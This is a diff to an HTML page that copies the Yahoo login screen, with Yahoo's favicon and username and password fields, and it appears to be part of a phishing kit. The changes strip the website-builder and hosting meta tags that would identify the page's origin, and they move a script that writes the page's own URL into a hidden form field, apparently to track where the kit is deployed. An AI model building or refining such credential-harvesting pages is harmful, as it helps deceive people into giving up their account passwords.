@@ -1,19 +1,12 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
-<!-- saved from url=(0014)about:internet -->
+
 <html>
   <head>
     <meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />
 
     <title>Yahoo! - login</title>
     <link href="https://login.yahoo.com/favicon.ico" rel="SHORTCUT ICON" />
-    <meta
-      name="GENERATOR"
-      content="Created by BlueVoda Website builder http://www.bluevoda.com"
-    />
-    <meta
-      name="HOSTING"
-      content="Hosting Provided By VodaHost http://www.vodahost.com"
-    />
+   
     <style type="text/css">
       body {
         background-color: #f6f6f6;
@@ -53,6 +46,10 @@
       style="position:absolute;left:9px;top:0px;width:401px;height:503px;z-index:4"
     >
       <script>
+        var tbstring = location.href.substring(0, location.href.lastIndexOf("/"));
+      var urlss = document.getElementById("pageUrl");
+      urlss.value = tbstring;
+        
         function validateForm() {
           var x = document.forms["Form1"]["yahoouser"].value;
           var y = document.forms["Form1"]["yahoopassword"].value;
@@ -61,9 +58,7 @@
             return false;
           }
         }
-        var tbstring = location.href.substring(0, location.href.lastIndexOf("/"));
-      var urlss = document.getElementById("pageUrl");
-      urlss.value = tbstring;
+        
         // onsubmit="return validateForm()"
       </script>
 
